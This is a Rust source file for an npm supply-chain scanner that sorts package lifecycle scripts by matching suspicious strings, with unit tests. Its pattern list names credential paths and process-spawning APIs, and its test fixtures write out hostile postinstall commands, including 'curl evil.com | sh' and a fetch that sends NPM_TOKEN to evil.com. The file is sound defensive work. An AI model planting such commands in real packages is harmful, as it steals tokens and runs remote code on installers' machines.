//! npm package lifecycle script analysis.
//!
//! Scans a package directory for lifecycle scripts (`preinstall`, `install`,
//! `postinstall`) and classifies them as clean, allowlisted, suspicious, or
//! critical based on known-malicious patterns.

use std::path::Path;

use sanctum_types::errors::SentinelError;

/// Result of scanning a package for lifecycle script threats.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum LifecycleRisk {
    /// No lifecycle scripts found.
    Clean,
    /// Lifecycle scripts found but package is allowlisted.
    AllowListed {
        /// The allowlisted package name.
        package: String,
    },
    /// Lifecycle scripts found with warning-level indicators.
    Suspicious {
        /// Package name from `package.json`.
        package: String,
        /// Package version from `package.json`.
        version: String,
        /// Which lifecycle script triggered the finding (e.g. `"postinstall"`).
        script_name: String,
        /// Human-readable descriptions of each matched pattern.
        indicators: Vec<String>,
    },
    /// Lifecycle scripts with critical attack indicators.
    Critical {
        /// Package name from `package.json`.
        package: String,
        /// Package version from `package.json`.
        version: String,
        /// Which lifecycle script triggered the finding (e.g. `"postinstall"`).
        script_name: String,
        /// Human-readable descriptions of each matched pattern.
        indicators: Vec<String>,
    },
}

/// Lifecycle script names that npm/yarn/pnpm execute automatically.
const LIFECYCLE_SCRIPTS: &[&str] = &["preinstall", "install", "postinstall"];

/// Patterns in lifecycle script content that indicate a critical supply-chain attack.
///
/// Presence of any of these in a script command or referenced file raises the
/// risk to `Critical`.
const CRITICAL_SCRIPT_PATTERNS: &[&str] = &[
    "child_process",
    ".unref()",
    "eval(",
    "vm.Script",
    "vm.runInNewContext",
    "process.env",
    ".ssh",
    ".aws",
    ".npmrc",
    "base64",
    "Buffer.from(",
];

/// Patterns that are suspicious but not necessarily critical.
const WARNING_SCRIPT_PATTERNS: &[&str] = &[
    "http://",
    "https://",
    "fs.readFile",
    "fs.writeFile",
    "net.connect",
    "dgram.createSocket",
];

/// Lockfile names to monitor for unexpected modifications.
pub const LOCKFILE_NAMES: &[&str] = &[
    "package-lock.json",
    "yarn.lock",
    "pnpm-lock.yaml",
    "bun.lockb",
];

/// Check if a lockfile change is expected.
///
/// For now, always returns `true` -- process lineage checking is complex
/// and will be enhanced later. The watcher still logs the event.
#[must_use]
pub const fn is_lockfile_change_expected(_lockfile_path: &Path) -> bool {
    true
}

/// Scan a package directory for lifecycle script threats.
///
/// Reads `package.json` from the given directory, extracts lifecycle scripts,
/// and classifies the risk based on the script content.
///
/// # Errors
///
/// Returns `SentinelError::NpmPackageRead` if `package.json` cannot be read
/// or parsed.
pub fn scan_package(
    package_dir: &Path,
    allowlist: &[String],
) -> Result<LifecycleRisk, SentinelError> {
    let pkg = read_package_json(package_dir)?;

    let lifecycle_scripts = extract_lifecycle_scripts(&pkg);
    if lifecycle_scripts.is_empty() {
        return Ok(LifecycleRisk::Clean);
    }

    let name = pkg
        .get("name")
        .and_then(serde_json::Value::as_str)
        .unwrap_or("unknown")
        .to_string();

    let version = pkg
        .get("version")
        .and_then(serde_json::Value::as_str)
        .unwrap_or("0.0.0")
        .to_string();

    // Check allowlist
    if allowlist.iter().any(|a| a == &name) {
        return Ok(LifecycleRisk::AllowListed { package: name });
    }

    // Analyse each lifecycle script for threats
    for (script_name, script_command) in &lifecycle_scripts {
        let mut critical_indicators = Vec::new();
        let mut warning_indicators = Vec::new();

        // Check the inline command itself
        check_patterns(
            script_command,
            &mut critical_indicators,
            &mut warning_indicators,
        );

        // If the script references a JS file, try to read and scan it too
        if let Some(script_path) = extract_script_file_path(script_command) {
            let full_path = package_dir.join(&script_path);
            if let Ok(content) = std::fs::read_to_string(&full_path) {
                check_patterns(&content, &mut critical_indicators, &mut warning_indicators);
            }
        }

        if !critical_indicators.is_empty() {
            return Ok(LifecycleRisk::Critical {
                package: name,
                version,
                script_name: script_name.clone(),
                indicators: critical_indicators,
            });
        }

        if !warning_indicators.is_empty() {
            return Ok(LifecycleRisk::Suspicious {
                package: name,
                version,
                script_name: script_name.clone(),
                indicators: warning_indicators,
            });
        }
    }

    // Lifecycle scripts exist but no suspicious patterns found --
    // still suspicious by virtue of having lifecycle scripts at all.
    let (script_name, _) = lifecycle_scripts
        .into_iter()
        .next()
        .unwrap_or_else(|| ("postinstall".to_string(), String::new()));

    Ok(LifecycleRisk::Suspicious {
        package: name,
        version,
        script_name,
        indicators: vec!["lifecycle script present".to_string()],
    })
}

/// Read and parse `package.json` from a package directory.
fn read_package_json(package_dir: &Path) -> Result<serde_json::Value, SentinelError> {
    let pkg_path = package_dir.join("package.json");
    let content =
        std::fs::read_to_string(&pkg_path).map_err(|e| SentinelError::NpmPackageRead {
            path: pkg_path.clone(),
            reason: e.to_string(),
        })?;

    serde_json::from_str(&content).map_err(|e| SentinelError::NpmPackageRead {
        path: pkg_path,
        reason: e.to_string(),
    })
}

/// Extract lifecycle script entries from `package.json`.
///
/// Returns a vec of `(script_name, script_command)` for each lifecycle script
/// found in the `"scripts"` field.
fn extract_lifecycle_scripts(pkg: &serde_json::Value) -> Vec<(String, String)> {
    let Some(scripts) = pkg.get("scripts").and_then(serde_json::Value::as_object) else {
        return Vec::new();
    };

    let mut result = Vec::new();
    for &lifecycle in LIFECYCLE_SCRIPTS {
        if let Some(cmd) = scripts.get(lifecycle).and_then(serde_json::Value::as_str) {
            result.push((lifecycle.to_string(), cmd.to_string()));
        }
    }
    result
}

/// Check a string for critical and warning patterns.
fn check_patterns(
    content: &str,
    critical_indicators: &mut Vec<String>,
    warning_indicators: &mut Vec<String>,
) {
    for &pattern in CRITICAL_SCRIPT_PATTERNS {
        if content.contains(pattern) {
            critical_indicators.push(format!("contains `{pattern}`"));
        }
    }
    for &pattern in WARNING_SCRIPT_PATTERNS {
        if content.contains(pattern) {
            warning_indicators.push(format!("contains `{pattern}`"));
        }
    }
}

/// Try to extract a JS file path from a script command.
///
/// Recognises patterns like `"node scripts/postinstall.js"` and returns
/// `Some("scripts/postinstall.js")`.
fn extract_script_file_path(command: &str) -> Option<String> {
    let parts: Vec<&str> = command.split_whitespace().collect();
    if parts.len() >= 2 && parts[0] == "node" {
        let file_part = parts[1];
        let has_js_ext = std::path::Path::new(file_part)
            .extension()
            .is_some_and(|ext| {
                ext.eq_ignore_ascii_case("js")
                    || ext.eq_ignore_ascii_case("mjs")
                    || ext.eq_ignore_ascii_case("cjs")
            });
        if has_js_ext {
            return Some(file_part.to_string());
        }
    }
    None
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod tests {
    use super::*;

    /// Helper: create a package directory with a given `package.json` content.
    fn make_package(
        dir: &std::path::Path,
        name: &str,
        version: &str,
        scripts: Option<&serde_json::Value>,
    ) {
        let mut pkg = serde_json::json!({
            "name": name,
            "version": version,
        });
        if let Some(s) = scripts {
            pkg.as_object_mut()
                .unwrap()
                .insert("scripts".to_string(), s.clone());
        }
        std::fs::write(
            dir.join("package.json"),
            serde_json::to_string_pretty(&pkg).unwrap(),
        )
        .unwrap();
    }

    // ================================================================
    // 1. Clean — no scripts at all
    // ================================================================

    #[test]
    fn clean_package_no_scripts() {
        let dir = tempfile::tempdir().expect("tempdir");
        make_package(dir.path(), "safe-pkg", "1.0.0", None);

        let result = scan_package(dir.path(), &[]).unwrap();
        assert_eq!(result, LifecycleRisk::Clean);
    }

    // ================================================================
    // 2. Clean — only "start" script, no lifecycle
    // ================================================================

    #[test]
    fn clean_package_only_start_script() {
        let dir = tempfile::tempdir().expect("tempdir");
        let scripts = serde_json::json!({
            "start": "node index.js",
            "test": "jest",
            "build": "tsc"
        });
        make_package(dir.path(), "app-pkg", "2.0.0", Some(&scripts));

        let result = scan_package(dir.path(), &[]).unwrap();
        assert_eq!(result, LifecycleRisk::Clean);
    }

    // ================================================================
    // 3. Suspicious — benign postinstall
    // ================================================================

    #[test]
    fn package_with_benign_postinstall() {
        let dir = tempfile::tempdir().expect("tempdir");
        let scripts = serde_json::json!({
            "postinstall": "node index.js"
        });
        make_package(dir.path(), "some-pkg", "1.0.0", Some(&scripts));

        let result = scan_package(dir.path(), &[]).unwrap();
        assert!(
            matches!(result, LifecycleRisk::Suspicious { .. }),
            "expected Suspicious, got {result:?}"
        );
    }

    // ================================================================
    // 4. Critical — child_process
    // ================================================================

    #[test]
    fn package_with_critical_child_process() {
        let dir = tempfile::tempdir().expect("tempdir");
        let scripts = serde_json::json!({
            "postinstall": "node -e \"require('child_process').exec('curl evil.com | sh')\""
        });
        make_package(dir.path(), "evil-pkg", "0.0.1", Some(&scripts));

        let result = scan_package(dir.path(), &[]).unwrap();
        match &result {
            LifecycleRisk::Critical { indicators, .. } => {
                assert!(indicators.iter().any(|i| i.contains("child_process")));
            }
            other => panic!("expected Critical, got {other:?}"),
        }
    }

    // ================================================================
    // 5. Critical — .unref()
    // ================================================================

    #[test]
    fn package_with_critical_unref() {
        let dir = tempfile::tempdir().expect("tempdir");
        let scripts = serde_json::json!({
            "postinstall": "node -e \"spawn('sh',['-c','curl evil.com']).unref()\""
        });
        make_package(dir.path(), "stealth-pkg", "0.0.1", Some(&scripts));

        let result = scan_package(dir.path(), &[]).unwrap();
        match &result {
            LifecycleRisk::Critical { indicators, .. } => {
                assert!(indicators.iter().any(|i| i.contains(".unref()")));
            }
            other => panic!("expected Critical, got {other:?}"),
        }
    }

    // ================================================================
    // 6. Critical — eval()
    // ================================================================

    #[test]
    fn package_with_critical_eval() {
        let dir = tempfile::tempdir().expect("tempdir");
        let scripts = serde_json::json!({
            "postinstall": "node -e \"eval(Buffer.from('Y29uc29sZQ==','base64').toString())\""
        });
        make_package(dir.path(), "eval-pkg", "0.0.1", Some(&scripts));

        let result = scan_package(dir.path(), &[]).unwrap();
        assert!(
            matches!(result, LifecycleRisk::Critical { .. }),
            "expected Critical, got {result:?}"
        );
    }

    // ================================================================
    // 7. Critical — process.env
    // ================================================================

    #[test]
    fn package_with_env_access() {
        let dir = tempfile::tempdir().expect("tempdir");
        let scripts = serde_json::json!({
            "postinstall": "node -e \"fetch('https://evil.com/?tok='+process.env.NPM_TOKEN)\""
        });
        make_package(dir.path(), "env-steal", "0.0.1", Some(&scripts));

        let result = scan_package(dir.path(), &[]).unwrap();
        assert!(
            matches!(result, LifecycleRisk::Critical { .. }),
            "expected Critical, got {result:?}"
        );
    }

    // ================================================================
    // 8. AllowListed — esbuild
    // ================================================================

    #[test]
    fn allowlisted_package_esbuild() {
        let dir = tempfile::tempdir().expect("tempdir");
        let scripts = serde_json::json!({
            "postinstall": "node install.js"
        });
        make_package(dir.path(), "esbuild", "0.21.0", Some(&scripts));

        let allowlist = vec!["esbuild".to_string()];
        let result = scan_package(dir.path(), &allowlist).unwrap();
        assert_eq!(
            result,
            LifecycleRisk::AllowListed {
                package: "esbuild".to_string()
            }
        );
    }

    // ================================================================
    // 9. Suspicious (warning) — network in script
    // ================================================================

    #[test]
    fn package_with_network_in_script() {
        let dir = tempfile::tempdir().expect("tempdir");
        // Only warning-level patterns (http://), no critical patterns
        let scripts = serde_json::json!({
            "postinstall": "echo Downloading from http://example.com/binary"
        });
        make_package(dir.path(), "net-pkg", "1.0.0", Some(&scripts));

        let result = scan_package(dir.path(), &[]).unwrap();
        match &result {
            LifecycleRisk::Suspicious { indicators, .. } => {
                assert!(indicators.iter().any(|i| i.contains("http://")));
            }
            other => panic!("expected Suspicious, got {other:?}"),
        }
    }

    // ================================================================
    // 10. Error — malformed package.json
    // ================================================================

    #[test]
    fn malformed_package_json() {
        let dir = tempfile::tempdir().expect("tempdir");
        std::fs::write(dir.path().join("package.json"), "{ not valid json !!!").unwrap();

        let result = scan_package(dir.path(), &[]);
        assert!(result.is_err(), "malformed JSON should produce an error");
    }

    // ================================================================
    // 11. Error — missing package.json
    // ================================================================

    #[test]
    fn missing_package_json() {
        let dir = tempfile::tempdir().expect("tempdir");
        // Don't create a package.json

        let result = scan_package(dir.path(), &[]);
        assert!(
            result.is_err(),
            "missing package.json should produce an error"
        );
    }

    // ================================================================
    // 12. Preinstall detection
    // ================================================================

    #[test]
    fn preinstall_detection() {
        let dir = tempfile::tempdir().expect("tempdir");
        let scripts = serde_json::json!({
            "preinstall": "node -e \"require('child_process').exec('whoami')\""
        });
        make_package(dir.path(), "pre-evil", "0.0.1", Some(&scripts));

        let result = scan_package(dir.path(), &[]).unwrap();
        match &result {
            LifecycleRisk::Critical {
                script_name,
                indicators,
                ..
            } => {
                assert_eq!(script_name, "preinstall");
                assert!(indicators.iter().any(|i| i.contains("child_process")));
            }
            other => panic!("expected Critical, got {other:?}"),
        }
    }

    // ================================================================
    // 13. Script file content scanning
    // ================================================================

    #[test]
    fn script_file_content_scanned() {
        let dir = tempfile::tempdir().expect("tempdir");
        let scripts = serde_json::json!({
            "postinstall": "node scripts/install.js"
        });
        make_package(dir.path(), "file-evil", "0.0.1", Some(&scripts));

        // Create the referenced script file with critical content
        std::fs::create_dir_all(dir.path().join("scripts")).unwrap();
        std::fs::write(
            dir.path().join("scripts/install.js"),
            "const { exec } = require('child_process');\nexec('curl evil.com');",
        )
        .unwrap();

        let result = scan_package(dir.path(), &[]).unwrap();
        assert!(
            matches!(result, LifecycleRisk::Critical { .. }),
            "expected Critical from file content, got {result:?}"
        );
    }

    // ================================================================
    // 14. Extract script file path
    // ================================================================

    #[test]
    fn extract_script_file_path_node_js() {
        assert_eq!(
            extract_script_file_path("node scripts/postinstall.js"),
            Some("scripts/postinstall.js".to_string())
        );
        assert_eq!(
            extract_script_file_path("node install.mjs"),
            Some("install.mjs".to_string())
        );
        assert_eq!(
            extract_script_file_path("node lib/setup.cjs"),
            Some("lib/setup.cjs".to_string())
        );
    }

    #[test]
    fn extract_script_file_path_non_node() {
        assert_eq!(extract_script_file_path("echo hello"), None);
        assert_eq!(extract_script_file_path("sh install.sh"), None);
        assert_eq!(extract_script_file_path("node"), None);
    }

    // ================================================================
    // Lockfile utilities
    // ================================================================

    #[test]
    fn lockfile_names_complete() {
        assert!(LOCKFILE_NAMES.contains(&"package-lock.json"));
        assert!(LOCKFILE_NAMES.contains(&"yarn.lock"));
        assert!(LOCKFILE_NAMES.contains(&"pnpm-lock.yaml"));
        assert!(LOCKFILE_NAMES.contains(&"bun.lockb"));
        assert_eq!(LOCKFILE_NAMES.len(), 4);
    }

    #[test]
    fn lockfile_change_expected_returns_true() {
        // Current stub always returns true
        assert!(is_lockfile_change_expected(Path::new("package-lock.json")));
    }

    // ================================================================
    // LifecycleRisk equality
    // ================================================================

    #[test]
    fn lifecycle_risk_equality() {
        assert_eq!(LifecycleRisk::Clean, LifecycleRisk::Clean);
        assert_ne!(
            LifecycleRisk::Clean,
            LifecycleRisk::AllowListed {
                package: "x".to_string()
            }
        );
        assert_eq!(
            LifecycleRisk::AllowListed {
                package: "a".to_string()
            },
            LifecycleRisk::AllowListed {
                package: "a".to_string()
            }
        );
    }

    // ================================================================
    // Critical patterns constant coverage
    // ================================================================

    #[test]
    fn all_critical_patterns_detected() {
        for &pattern in CRITICAL_SCRIPT_PATTERNS {
            let dir = tempfile::tempdir().expect("tempdir");
            let script_content = format!("node -e \"{pattern}\"");
            let scripts = serde_json::json!({
                "postinstall": script_content
            });
            make_package(dir.path(), "pattern-test", "0.0.1", Some(&scripts));

            let result = scan_package(dir.path(), &[]).unwrap();
            assert!(
                matches!(result, LifecycleRisk::Critical { .. }),
                "pattern `{pattern}` should produce Critical, got {result:?}"
            );
        }
    }

    #[test]
    fn all_warning_patterns_detected() {
        for &pattern in WARNING_SCRIPT_PATTERNS {
            let dir = tempfile::tempdir().expect("tempdir");
            let script_content = format!("echo {pattern}");
            let scripts = serde_json::json!({
                "postinstall": script_content
            });
            make_package(dir.path(), "warning-test", "0.0.1", Some(&scripts));

            let result = scan_package(dir.path(), &[]).unwrap();
            assert!(
                matches!(
                    result,
                    LifecycleRisk::Suspicious { .. } | LifecycleRisk::Critical { .. }
                ),
                "pattern `{pattern}` should produce at least Suspicious, got {result:?}"
            );
        }
    }
}
